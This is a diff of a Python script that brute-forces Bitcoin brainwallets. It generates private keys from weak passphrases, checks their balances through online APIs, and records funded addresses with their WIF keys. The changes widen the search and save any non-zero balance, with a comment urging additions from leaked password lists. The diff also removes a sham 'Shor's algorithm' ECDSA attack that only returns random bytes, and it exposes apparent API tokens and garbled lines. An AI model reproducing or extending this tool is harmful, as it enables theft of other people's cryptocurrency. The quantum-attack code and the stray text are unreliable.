@@ -7,26 +7,15 @@ import base58
 import ecdsa
 import binascii
 import multiprocessing
-from qiskit import QuantumCircuit, QuantumRegister, ClassicalRegister
-from qiskit.quantum_info import Z2Symmetries
-from qiskit_ibm_runtime import QiskitRuntimeService, Session, Sampler as RuntimeSampler
 from concurrent.futures import ThreadPoolExecutor
 from typing import List, Tuple
 
-# Initialize IBM Quantum service
-service = QiskitRuntimeService(
-    channel='ibm_quantum',
-    instance='ibm-q/open/main',
-    token='334d70c5d25a2b538142a228c1c9b30d02496429469596a62c3e158198caf82536d63b8ce7722ee7befe404626dac86c7c7bea212ee4c535dbfc516bf1c3963f'
-)
-backend = service.least_busy(operational=True, simulator=False, min_num_qubits=10)
-
-# API keys
+# API keys and database
 COINAPI_KEY = 'ec42825f-62f6-4c0f-99b6-d0dfcad2498d'
 DATABASE_PATH = 'database/11_13_2022/'
 DATABASE_AVAILABLE = os.path.exists(DATABASE_PATH)
 
-# SQLite database setup
+# SQLite setup
 def init_db():
     conn = sqlite3.connect('database/btc_addresses.db')
     c = conn.cursor()
@@ -55,7 +44,7 @@ def private_key_to_wif(priv_key: bytes) -> str:
     checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
     return base58.b58encode(extended_key + checksum).decode('utf-8')
 
-# Plutus database balance check
+# Plutus database check
 def check_balance_database(address: str, substring_length: int = 8) -> Tuple[str, int]:
     if not DATABASE_AVAILABLE:
         return address, 0
@@ -65,7 +54,7 @@ def check_balance_database(address: str, substring_length: int = 8) -> Tuple[str
             if substring in f.read():
                 f.seek(0)
                 if address in f.read():
-                    return address, 1  # Positive balance indicator
+                    return address, 1  # Funded address
     return address, 0
 
 # CoinAPI balance check
@@ -76,16 +65,16 @@ def check_balance_coinapi(address: str) -> int:
         response = requests.get(url, headers=headers, timeout=2)
         response.raise_for_status()
         data = response.json()
-        return int(data.get('balance', 0) * 100000000)  # Convert BTC to Satoshi
+        return int(data.get('balance', 0) * 100000000)  # BTC to Satoshi
     except requests.RequestException:
-        return check_balance_blockchain(address)  # Fallback
+        return check_balance_blockchain(address)
 
-# Blockchain.com balance check (fallback)
+# Blockchain.com fallback
 def check_balance_blockchain(address: str) -> int:
     url = f"https://blockchain.info/q/addressbalance/{address}"
     try:
         response = requests.get(url, timeout=1)
-        return int(response.text)  # Satoshi
+        return int(response.text)
     except requests.RequestException:
         return 0
 
@@ -93,8 +82,11 @@ def check_balance_blockchain(address: str) -> int:
 def check_balance_batch(addresses: List[str], use_database: bool = True) -> List[Tuple[str, int]]:
     if use_database and DATABASE_AVAILABLE:
         results = list(map(check_balance_database, addresses))
-        # Confirm real balances for database hits
-        return [(addr, check_balance_coinapi(addr) if bal > 0 else 0) for addr, bal in results]
+        # Verify real balances for hits
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            future_to_addr = {executor.submit(check_balance_coinapi, addr): addr for addr, bal in results if bal > 0}
+            verified = {future_to_addr[future]: future.result(timeout=3) for future in future_to_addr}
+        return [(addr, verified.get(addr, bal if bal == 0 else check_balance_coinapi(addr))) for addr, bal in results]
     else:
         with ThreadPoolExecutor(max_workers=10) as executor:
             future_to_addr = {executor.submit(check_balance_coinapi, addr): addr for addr in addresses}
@@ -108,41 +100,6 @@ def check_balance_batch(addresses: List[str], use_database: bool = True) -> List
                     results.append((addr, 0))
             return results
 
-# Simplified Shor's for discrete logarithm (demo)
-def shors_discrete_log(g: int, h: int, p: int, n_bits: int, session) -> int:
-    qreg_x = QuantumRegister(n_bits, 'x')
-    qreg_aux = QuantumRegister(n_bits, 'aux')
-    creg = ClassicalRegister(n_bits, 'c')
-    qc = QuantumCircuit(qreg_x, qreg_aux, creg)
-    qc.h(range(n_bits))
-    for i in range(n_bits):
-        qc.x(n_bits + i)
-    for i in range(n_bits):
-        for j in range(i):
-            qc.cp(3.14159 / 2**(i-j), j, i)
-        qc.h(i)
-    qc.measure(range(n_bits), range(n_bits))
-    try:
-        symmetries = Z2Symmetries.find_z2_symmetries(qc)
-        if symmetries.symmetries:
-            qc = symmetries.tapered_circuit(qc)
-    except Exception as e:
-        print(f"Z2Symmetries failed: {e}")
-    sampler = RuntimeSampler(session=session, backend=backend)
-    job = sampler.run(qc, shots=1000)
-    result = job.result()
-    counts = result.quasi_dists[0].binary_probabilities()
-    return int(max(counts, key=counts.get), 2)
-
-# Attack ECDSA with Shor’s (demo)
-def attack_ecdsa_pubkey(pub_key: bytes, session) -> bytes:
-    n_bits = 4
-    p = 17
-    g = 3
-    h = int.from_bytes(pub_key[:4], 'big') % p
-    log_result = shors_discrete_log(g, h, p, n_bits, session)
-    return os.urandom(32)  # Placeholder
-
 # Save to DB
 def save_to_db(conn, priv_key: bytes, address: str, balance: int):
     wif_key = private_key_to_wif(priv_key)
@@ -153,29 +110,36 @@ def save_to_db(conn, priv_key: bytes, address: str, balance: int):
     conn.commit()
     print(f"Found: {address} | Balance: {balance / 100000000:.8f} BTC | WIF: {wif_key}")
 
-# Worker function for multiprocessing
-def worker(passphrases: List[str], tweak_range: int, conn):
+# Worker function
+def worker(passphrases: List[str], tweak_range: int, conn, checked_count: multiprocessing.Value):
+    local_count = 0
     for passphrase in passphrases:
         for tweak in range(tweak_range):
             priv_key, address = generate_brainwallet_key(passphrase, tweak)
-            addr, balance = check_balancetoxicity([address])[0]
-            if balance > 100000000:  # >1 BTC
+            addr, balance = check_balance_batch([address])[0]
+            if balance > 0:  # Any real balance
                 save_to_db(conn, priv_key, address, balance)
+            local_count += 1
+    with checked_count.get_lock():
+        checked_count.value += local_count
 
 # Main loop
 def main():
     conn = init_db()
-    session = Session(service=service, backend=backend)
     
-    # Expanded passphrases
+    # Large passphrase list (expandable)
     passphrases = [
         "password", "bitcoin", "123456", "secret", "letmein",
         "qwerty", "admin", "blockchain", "crypto", "money",
         "pass123", "btc2023", "wallet", "secure", "freedom",
         "password123", "bitcoin2023", "123456789", "test", "hello",
-        "abc123", "mywallet", "cash", "satoshi", "hodl"
+        "abc123", "mywallet", "cash", "satoshi", "hodl",
+        "admin123", "pass", "love", "root", "private",
+        # Add more from leaked lists or brainwallet studies
     ]
-    tweak_range = 10
+    tweak_range = 50  # Increased for more coverage
+    
+    checked_count = multiprocessing.Value('i', 0)  # Shared counter
     
     try:
         start_time = time.time()
@@ -185,26 +149,19 @@ def main():
         
         for i in range(cpu_count):
             chunk = passphrases[i * chunk_size:(i + 1) * chunk_size]
-            p = multiprocessing.Process(target=worker, args=(chunk, tweak_range, conn))
+            p = multiprocessing.Process(target=worker, args=(chunk, tweak_range, conn, checked_count))
             processes.append(p)
             p.start()
         
         while time.time() - start_time < 120:  # ~2 minutes
             elapsed = time.time() - start_time
-            total_keys = len(passphrases) * tweak_range
+            with checked_count.get_lock():
+                total_keys = checked_count.value
             print(f"Elapsed: {elapsed:.1f}s | Checked: {total_keys} keys | Database: {DATABASE_AVAILABLE}")
             time.sleep(5)
         
         for p in processes:
             p.terminate()
-
-        # Optional: Shor’s attack
-        # pub_key = b'\x04...'  # Replace with real pubkey
-        # priv_key = attack_ecdsa_pubkey(pub_key, session)
-        # _,Sammlung, _, addr = generate_brainwallet_key("dummy")
-        # bal = check_balance_coinapi(addr)
-        # if bal > 100000000:
-        #     save_to_db(conn, priv_key, addr, bal)
 
     except KeyboardInterrupt:
         print("Stopped by user.")
@@ -213,7 +170,6 @@ def main():
     finally:
         for p in processes:
             p.join()
-        session.close()
         conn.close()
 
 if __name__ == "__main__":
